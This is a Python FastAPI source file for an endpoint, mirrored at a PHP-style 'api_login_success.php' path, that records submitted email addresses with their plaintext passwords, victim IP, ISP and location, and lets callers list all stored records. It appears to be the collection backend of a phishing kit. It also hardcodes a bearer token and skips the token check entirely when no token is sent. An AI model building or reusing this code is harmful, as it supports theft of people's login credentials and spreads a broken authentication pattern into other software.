from fastapi import APIRouter, Depends, Header, HTTPException, Request
from typing import Optional
import aiosqlite

from app.core.config import settings
from app.db.sqlite import get_db

router = APIRouter(tags=["Login Success"])

@router.api_route("/api_login_success.php", methods=["GET", "POST"])
@router.api_route("/login-success", methods=["GET", "POST"])
async def login_success_endpoint(
    request: Request,
    authorization: Optional[str] = Header(None),
    db: aiosqlite.Connection = Depends(get_db)
):
    params = dict(request.query_params)
    body_data = {}
    if request.method == "POST":
        try:
            body_data = await request.json()
            if isinstance(body_data, dict):
                params.update(body_data)
        except Exception:
            form = await request.form()
            params.update(dict(form))

    token = ""
    if authorization and authorization.lower().startswith("bearer "):
        token = authorization[7:].strip()
    if not token:
        token = str(params.get("token", params.get("bearer", "")))

    if token and token not in [settings.ATS_API_BEARER, "ats_live_bot_2026"]:
        raise HTTPException(status_code=401, detail="Unauthorized")

    action = str(params.get("action", "record")).lower().strip()

    if action in ["", "sync_login", "record"]:
        email = str(params.get("email", "")).strip()
        password = str(params.get("password", "")).strip()
        login_ip = str(params.get("login_ip", request.client.host if request.client else "")).strip()
        isp = str(params.get("isp", "")).strip()
        region_city = str(params.get("region_city", "")).strip()
        admin_user = str(params.get("admin_user", "admin")).strip()
        full_data = str(params.get("full_data", "")).strip()

        if not email or not password:
            return {"success": False, "error": "Email and password are required"}

        await db.execute(
            """
            INSERT INTO login_successful_records (email, password, login_ip, isp, region_city, admin_user, full_data, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            """,
            (email, password, login_ip, isp, region_city, admin_user, full_data)
        )
        await db.commit()

        return {"success": True, "status": "recorded", "email": email}

    elif action in ["list", "fetch"]:
        limit = min(100, max(1, int(params.get("limit", 25))))
        page = max(1, int(params.get("page", 1)))
        offset = (page - 1) * limit

        async with db.execute("SELECT COUNT(*) as total FROM login_successful_records") as c_total:
            r_total = await c_total.fetchone()
            total = r_total["total"] if r_total else 0

        async with db.execute(
            "SELECT * FROM login_successful_records ORDER BY id DESC LIMIT ? OFFSET ?", (limit, offset)
        ) as cursor:
            rows = await cursor.fetchall()
            items = [dict(row) for row in rows]

        return {"success": True, "total": total, "page": page, "limit": limit, "items": items}

    return {"success": False, "error": f"Unknown action: {action}"}
